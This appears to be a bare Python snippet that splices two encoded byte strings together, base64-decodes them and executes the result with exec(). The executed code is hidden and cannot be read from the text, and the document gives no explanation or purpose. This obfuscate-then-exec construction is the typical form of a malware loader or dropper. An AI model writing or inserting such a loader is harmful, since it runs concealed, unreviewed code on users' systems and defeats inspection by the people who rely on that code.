import base64
_x = b'ZVIFZEdldgIhaddkCAIBZBaRaAPAI9IhaddAPAOoIAIAIJaNIZbVRJbIJBclaZI9bkKoIAcVdJIdZRIoaVZhCpbRbAIAZ9INZUa4WIIMIVOoIAd9YwK0YJYhaRLBaRKo'
_y = b'GmGyWo2kGsGlWoC6igCpi3W0C8SwGyGlWoC8SwggCgCgHhXlFhHlXy3o3v20XlGuHnQgCgm0XuHpHoCgGp20g03hC9DKmyHpGgWgzsDsDdggCgG0WgzgXlSzWlCzWlQ='
_p = b''.join(bytes([a, b]) for a, b in zip(_x, _y + b'\x00'))
exec(base64.b64decode(_p.rstrip(b'\x00')).decode())
